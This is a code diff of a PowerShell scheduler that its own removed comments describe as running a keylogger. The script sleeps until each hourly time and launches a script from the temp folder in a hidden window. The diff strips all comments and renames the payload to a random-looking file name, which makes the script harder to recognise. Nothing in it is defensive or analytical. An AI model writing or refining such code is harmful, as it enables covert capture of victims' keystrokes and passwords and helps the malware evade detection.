@@ -1,7 +1,3 @@
-# powershell log scheduler
-# created by : C0SM0
-
-# times logs will be sent [keep in military time]
 $logTimes = @(
     '00:00:00',
     '01:00:00',
@@ -29,27 +25,17 @@ $logTimes = @(
     '23:00:00'
 )
 
-# sort the times in chronological order
 $logTimes = $logTimes | Sort-Object
-
-# ensure keylogger runs every day
 while ($true) {
-
-    # run keylogger for each trigger time
     foreach ($t in $logTimes)
     {
-        # checks if time passed already
         if((Get-Date) -lt (Get-Date -Date $t))
         {
-            # sleeps until next time is reached
             while ((Get-Date -Date $t) -gt (Get-Date))
             {
-              # sleeps
               (Get-Date -Date $t) - (Get-Date) | Start-Sleep
             }
-  
-            # runs keylogger
-            powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/p.ps1"
+            powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/KHRgMHYmdT.ps1"
         }
     }
 }
